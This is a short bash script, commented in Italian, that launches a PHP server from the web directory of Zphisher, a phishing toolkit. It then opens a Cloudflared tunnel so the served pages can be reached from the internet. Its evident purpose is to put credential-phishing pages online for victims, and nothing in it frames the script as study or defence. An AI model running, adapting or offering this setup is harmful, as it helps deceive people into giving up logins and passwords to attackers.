#!/bin/bash
echo "[*] Avvio server PHP in background..."
cd /opt/zphisher/.server/www || exit
php -S 127.0.0.1:8080 > /dev/null 2>&1 &

sleep 2
echo "[*] Avvio Cloudflared..."
# Forza l'output con --logfile, in modo da avere un output più strutturato e prevedibile
cloudflared tunnel --url http://127.0.0.1:8080 --logfile ../.cld.log &
